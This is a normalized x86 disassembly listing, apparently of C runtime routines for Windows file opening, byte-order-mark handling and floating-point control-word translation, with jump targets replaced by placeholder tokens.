push ebx
push edi
mov edi [ ebp + 0x28 ]
xor ebx ebx
sar edx 0x6
imul ecx eax 0x30
mov [ edi ] bl
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x80
jne r-xdata
push esi
mov esi [ ebp + 0x24 ]
test esi 0x74000
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
and eax 0x74000
cmp eax 0x4000
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
call sub_417dd8
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi ] bl
cmp eax 0x10000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413b2e
int3
mov eax [ ebp - 0x4 ]
and eax 0x74000
jne r-xdata
xor eax eax
test [ ebp + 0xc ] 0x40
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
or esi eax
jmp r-xdata
or esi 0x4000
mov eax [ ebp + 0x10 ]
mov edx 0xc0000000
and eax edx
mov ecx ebx
mov esi ebx
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ edi ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp + 0x8 ]
call sub_426b53
mov edx eax
add esp 0xc
test edx edx
jle r-xdata
cmp eax edx
jne r-xdata
cmp eax 0x40000
je r-xdata
xor esi esi
inc esi
cmp eax 0x4
jbe r-xdata
cmp edx 0xffffffff
je r-xdata
lea ecx [ esi - 0x1 ]
neg ecx
sbb ecx ecx
and esi ecx
mov [ edi ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
test esi esi
je r-xdata
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_41da40
add esp 0x10
or eax edx
je r-xdata
cmp eax 0x5
je r-xdata
call sub_41529e
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp edx 0x2
je r-xdata
movsx eax [ edi ]
mov esi ebx
mov [ ebp - 0x4 ] ebx
sub eax 0x1
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
pop esi
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp edx 0x3
jne r-xdata
push 0x3
mov [ ebp - 0x4 ] 0xbfbbef
pop esi
sub eax 0x1
jne r-xdata
mov ecx [ ebp + 0x10 ]
shr ecx 0x1f
jmp r-xdata
cmp eax 0xfeff
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp eax 0xbfbbef
jne r-xdata
mov eax esi
sub eax ebx
push eax
lea eax [ ebp - 0x4 ]
add eax ebx
push eax
push [ ebp + 0x8 ]
call sub_41d027
add esp 0xc
cmp eax 0xffffffff
je r-xdata
test esi esi
jle r-xdata
push 0x2
mov [ ebp - 0x4 ] 0xfeff
pop esi
jmp r-xdata
test ecx ecx
je r-xdata
push ebx
push ebx
push 0x2
push [ ebp + 0x8 ]
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ edi ] 0x1
jmp r-xdata
add ebx eax
cmp esi ebx
jg r-xdata
mov [ edi ] 0x2
jmp r-xdata
jmp r-xdata
sub_427e26
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
or eax [ ebp + 0x24 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
pop ebp
retn
sub_427e4b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
jg r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
push 0x5
jmp r-xdata
cmp eax edx
je r-xdata
cmp eax 0x100
je r-xdata
pop eax
pop ebp
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp eax 0x300
jne r-xdata
push 0x2
jmp r-xdata
sub_427ebb
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
push esi
mov esi [ ebp + 0x8 ]
and eax 0x3
push edi
mov edi 0x80000000
mov [ esi ] 0x0
sub eax 0x0
je r-xdata
mov eax edi
sub eax 0x1
je r-xdata
xor eax eax
sub eax ecx
je r-xdata
test ebx 0x70000
setne cl
test bl 0x8
setne al
and cl al
movzx eax cl
neg eax
sbb eax eax
and eax edi
add eax 0x40000000
jmp r-xdata
sub eax 0x1
je r-xdata
mov edi 0x8000
test edi ebx
jne r-xdata
or [ esi ] 0x10
xor eax eax
inc eax
jmp r-xdata
sub eax ecx
je r-xdata
push ebx
mov [ esi + 0x4 ] eax
call sub_427e4b
pop ecx
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax 0xc0000000
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
mov ecx 0x100
test ecx ebx
je r-xdata
test ebx 0x74000
jne r-xdata
and [ esi + 0x14 ] 0x0
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x80
test bl bl
jns r-xdata
push 0x2
sub eax ecx
je r-xdata
test bl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x14 ]
test al al
js r-xdata
or [ esi ] 0x80
lea eax [ ebp - 0x4 ]
push eax
call sub_417dd8
pop ecx
test eax eax
jne r-xdata
push 0x3
jmp r-xdata
sub eax 0x40
je r-xdata
test ebx 0x1000
je r-xdata
or [ esi + 0x14 ] 0x4000000
or [ esi + 0x4 ] 0x10000
or [ esi + 0xc ] 0x4
mov [ esi + 0x10 ] 0x1
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
cmp [ ebp - 0x4 ] edi
je r-xdata
pop eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x4 ] edi
sete al
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
test ebx 0x2000
je r-xdata
or [ esi + 0x10 ] ecx
test bl 0x20
je r-xdata
or [ esi + 0x14 ] 0x2000000
test bl 0x10
je r-xdata
or [ esi + 0x14 ] 0x8000000
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
or [ esi + 0x14 ] 0x10000000
sub_428037
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
and eax 0x3f
mov edx esi
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov al [ eax + ecx + 0x28 ]
test al 0x48
je r-xdata
test al al
jns r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push 0x2
push 0xffffffff
push 0xffffffff
push esi
call sub_41da40
mov edi eax
mov ebx edx
mov ecx edi
add esp 0x10
and ecx ebx
cmp ecx 0xffffffff
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push esi
call sub_426b53
add esp 0xc
test eax eax
jne r-xdata
call sub_41528b
cmp [ eax ] 0x83
jne r-xdata
xor eax eax
push eax
push eax
push eax
push esi
call sub_41da40
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
call sub_41529e
mov eax [ eax ]
jmp r-xdata
xor eax eax
push ebx
push edi
push esi
call sub_429208
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop edi
pop ebx
sub_4280e7
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_429141
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp - 0x4 ]
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428158
push esi
mov edi eax
call sub_41a3a5
add esp 0x20
mov eax edi
pop edi
pop esi
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_428138
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_427b0d
add esp 0x18
pop ebp
retn
sub_428158
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x44 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call sub_427ebb
add esp 0x10
lea edi [ ebp - 0x2c ]
mov esi eax
push 0x6
pop ecx
[ edi ] [ esi ]
or esi 0xffffffff
cmp [ ebp - 0x20 ] esi
jne r-xdata
call sub_41f9f3
mov ebx [ ebp + 0xc ]
mov [ ebx ] eax
cmp eax esi
jne r-xdata
call sub_41528b
and [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x2c ]
and [ ebp - 0x10 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x14 ] 0xc
sub esp 0x18
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
shr eax 0x7
not eax
and eax ecx
push 0x6
pop ecx
mov [ ebp - 0xc ] eax
mov edi esp
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_427e26
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
mov edx 0xc0000000
cmp edi 0xffffffff
jne r-xdata
call sub_41528b
and [ eax ] 0x0
mov [ ebx ] esi
call sub_41529e
mov [ eax ] 0x18
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
call sub_41529e
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_415268
pop ecx
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
push edi
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_415268
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
mov al [ ebp - 0x2c ]
jne r-xdata
mov al [ ebp - 0x2c ]
or al 0x40
jmp r-xdata
call sub_41529e
mov [ eax ] 0xd
jmp r-xdata
sub esp 0x18
lea eax [ ebp - 0x14 ]
and ecx 0x7fffffff
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_427e26
mov edi eax
add esp 0x20
mov [ ebp - 0x8 ] edi
cmp edi 0xffffffff
jne r-xdata
push edi
push [ ebx ]
mov [ ebp - 0x1 ] al
call sub_41f93c
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ ebx ]
or dl 0x1
mov eax ecx
mov [ ebp - 0x1 ] dl
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov [ ebp - 0x2c ] dl
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x28 ] dl
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
test [ ebp + 0x14 ] 0x2
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x29 ] 0x0
je r-xdata
or al 0x8
lea eax [ ebp - 0x2 ]
mov [ ebp - 0x2 ] 0x0
push eax
push [ ebp + 0x14 ]
lea esi [ ebp - 0x2c ]
sub esp 0x18
push 0x6
pop ecx
mov edi esp
push [ ebx ]
[ edi ] [ esi ]
call sub_427bd9
add esp 0x24
test eax eax
je r-xdata
push [ ebx ]
call sub_428037
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov eax [ ebx ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov al [ ebp - 0x2 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x29 ] al
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul edx ecx 0x30
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x14 ]
shr eax 0x10
xor al [ ecx + edx + 0x2d ]
and al 0x1
xor [ ecx + edx + 0x2d ] al
test [ ebp - 0x1 ] 0x48
jne r-xdata
mov esi eax
push [ ebx ]
call sub_41dc24
pop ecx
mov eax esi
jmp r-xdata
mov esi [ ebp - 0x28 ]
mov ecx 0xc0000000
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
test [ ebp + 0x14 ] 0x8
je r-xdata
xor eax eax
test [ ebp + 0x14 ] 0x1
je r-xdata
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
or [ eax + ecx + 0x28 ] 0x20
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
sub esp 0x18
lea eax [ ebp - 0x14 ]
and esi 0x7fffffff
mov [ ebp - 0x28 ] esi
lea esi [ ebp - 0x2c ]
push 0x6
pop ecx
mov edi esp
push eax
push [ ebp + 0x10 ]
[ edi ] [ esi ]
call sub_427e26
mov edx eax
add esp 0x20
cmp edx 0xffffffff
jne r-xdata
mov ecx [ ebx ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x18 ] edx
call [ GetLastError@IAT ]
push eax
call sub_415268
mov ecx [ ebx ]
mov eax ecx
and ecx 0x3f
sar eax 0x6
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
push [ ebx ]
call sub_41fb05
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_428481
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x7e80
je r-xdata
mov eax ecx
pop ebp
retn
test dl dl
jns r-xdata
push edi
mov edi 0x200
test edi edx
je r-xdata
push 0x10
pop ecx
test edx 0x400
je r-xdata
or ecx 0x8
test edx 0x800
je r-xdata
or ecx 0x4
test edx 0x1000
je r-xdata
or ecx 0x2
push esi
mov esi 0x6000
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x4000
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x2000
je r-xdata
or ecx 0x100
jmp r-xdata
pop edi
or ecx edi
sub_4284fe
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0xc3d
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
test dl 0x8
je r-xdata
or ecx 0x8
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x20
je r-xdata
or ecx 0x2
push esi
mov esi 0xc00
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x800
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or ecx 0x100
jmp r-xdata
or ecx 0x200
sub_428571
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
test dl 0x8
je r-xdata
inc ecx
test dl 0x4
je r-xdata
or ecx 0x4
test dl 0x2
je r-xdata
or ecx 0x8
test dl 0x1
je r-xdata
or ecx 0x10
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x20
test edx 0x200
je r-xdata
or ecx 0xc00
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x400
jmp r-xdata
or ecx 0x800
sub_4285e2
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
push edi
mov edi 0x200
test dl 0x8
je r-xdata
mov ecx 0x80
test dl 0x4
je r-xdata
or ecx edi
test dl 0x2
je r-xdata
or ecx 0x400
test dl 0x1
je r-xdata
or ecx 0x800
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1000
test edi edx
je r-xdata
or ecx 0x6000
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x2000
jmp r-xdata
pop edi
or ecx 0x4000
sub_428662
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x10000010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x8000008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x4000004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x2000002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x1000001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_4286c3
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test dl 0x1f
je r-xdata
mov eax ecx
pop ebp
retn
push esi
mov esi 0x100010
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
mov esi 0x80008
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
inc ecx
mov esi 0x40004
mov eax edx
and eax esi
cmp eax esi
jne r-xdata
or ecx 0x4
mov esi 0x20002
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x8
mov eax 0x10001
and edx eax
cmp edx eax
jne r-xdata
or ecx 0x10
or ecx 0x20
sub_428724
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
and [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
fnstcw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ebp - 0x4 ]
push esi
push eax
call sub_4284fe
push [ ebp - 0x8 ]
mov esi eax
call sub_428481
pop ecx
or eax esi
pop ecx
and eax 0x31f
pop esi
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
sub_428767
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
xor ecx ecx
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x8 ] ecx
fnstsw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx edx [ ebp - 0x4 ]
mov eax ecx
test dl 0x3d
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
test dl 0x3d
je r-xdata
test dl 0x1
je r-xdata
or eax ecx
and eax 0x1f1f001f
mov esp ebp
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
mov eax 0x100010
test dl 0x4
je r-xdata
mov ecx 0x10000010
test dl 0x8
je r-xdata
or eax 0x80008
test dl 0x8
je r-xdata
or ecx 0x8000008
test dl 0x10
je r-xdata
or eax 0x40004
test dl 0x10
je r-xdata
or ecx 0x4000004
test dl 0x20
je r-xdata
or eax 0x20002
test dl 0x20
je r-xdata
or ecx 0x2000002
or eax 0x10001
or ecx 0x1000001
sub_42880f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x31f
push ebx
call sub_428571
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x20 ]
call sub_428571
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x20 ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_4285e2
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_4285e2
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_42888f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x1f1f001f
push ebx
call sub_4286c3
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x1c ]
call sub_4286c3
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x1c ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_428662
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_428662
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_42890f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi sub_417cd9
push [ rw-data ]
call [ DecodePointer@IAT ]
mov edi eax
jmp r-xdata
sub eax 0x1b
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x1a
jg r-xdata
mov [ ebp - 0x24 ] 0x2
sub eax 0x1
je r-xdata
fld1
cmp eax 0xe
jg r-xdata
fld [ ebp - 0xc ]
fstp [ esi ]
call sub_41529e
mov [ eax ] 0x22
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x15
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub eax 0xf
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x1
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x24 ] 0x3
mov [ ebp - 0x20 ] r--data
jmp r-xdata
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x21
jmp r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x4
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x3
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3ab
je r-xdata
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
fstp [ eax ]
jmp r-xdata
mov [ ebp - 0x20 ] r--data
sub_428b27
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
push edi
movzx ecx [ eax ]
mov [ ebp - 0x84 ] ecx
mov eax [ esi ]
sub eax 0x1
je r-xdata
push 0x8
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
sub eax 0x1
je r-xdata
push [ esi ]
call sub_42365b
pop ecx
call sub_417cac
test al al
je r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
or eax 0x3
fstp [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_423167
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
sub eax 0x1
je r-xdata
push esi
call sub_417cd9
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
sub eax 0x3
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_423347
add esp 0x18
push 0xffff
push ecx
call sub_423916
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_428c48
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x18
cmp [ ebp + 0x8 ] ax
je r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_414048
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xa8 ]
test eax eax
jne r-xdata
mov edx 0x100
push 0x1
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp ax 0x19
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_429399
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_41c837
pop ecx
pop ecx
test eax eax
jne r-xdata
movzx eax cx
mov [ ebp - 0x8 ] eax
jmp r-xdata
add cx 0x20
movzx eax cx
mov [ ebp - 0x8 ] eax
mov cx ax
mov ax [ ebp - 0x4 ]
mov ax [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x94 ]
movzx eax [ eax + ecx ]
mov ax [ ebp + 0x8 ]
movzx eax ax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x350 ] 0xfffffffd
